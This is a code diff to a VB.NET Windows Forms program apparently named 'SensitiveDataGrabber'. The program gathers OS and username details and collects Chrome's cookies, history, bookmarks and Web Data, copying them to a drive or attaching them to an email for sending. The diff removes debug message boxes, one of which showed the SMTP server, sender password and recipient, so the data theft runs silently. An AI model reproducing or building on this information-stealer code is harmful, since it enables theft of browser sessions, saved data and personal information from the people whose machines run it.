@@ -124,7 +124,6 @@ Public Class MainForm
             End Using
 
         ElseIf method = "2" Then
-            MessageBox.Show(temporary)
             Using sw As StreamWriter = New StreamWriter(temporary)
                 sw.WriteLine("OS: " & getOSVersion)
                 sw.WriteLine("Username: " & getUserName)
@@ -159,7 +158,6 @@ Public Class MainForm
             File.Copy(chromeDirectory & "\Web Data", driveLetter & "SensitiveDataGrabber\Chrome\webdata.sqlite", True)
 
         ElseIf method = "2" Then
-            MessageBox.Show("test")
             Dim chromeBookmarks As Attachment = New Attachment(chromeDirectory & "\Bookmarks")
             Dim chromeCookies As Attachment = New Attachment(chromeDirectory & "\Cookies")
             Dim chromeHistory As Attachment = New Attachment(chromeDirectory & "\History")
@@ -173,7 +171,7 @@ Public Class MainForm
             mail.Attachments.Add(chromeWebData)
 
         Else
-            MessageBox.Show("test2")
+
         End If
 
         Return Nothing
@@ -467,9 +465,6 @@ Public Class MainForm
             method = "2"
             Button1.Enabled = False
             Button1.Text = "Working"
-
-            MessageBox.Show(emailSMTPServer & vbCrLf & emailSMTPPort & vbCrLf & emailSenderEmail & vbCrLf &
-                         emailSenderPassword & vbCrLf & emailReciever & vbCrLf & emailDefaultSubject)
 
             getBasicInfo()
             If chkChrome.Checked = True Then getChrome()
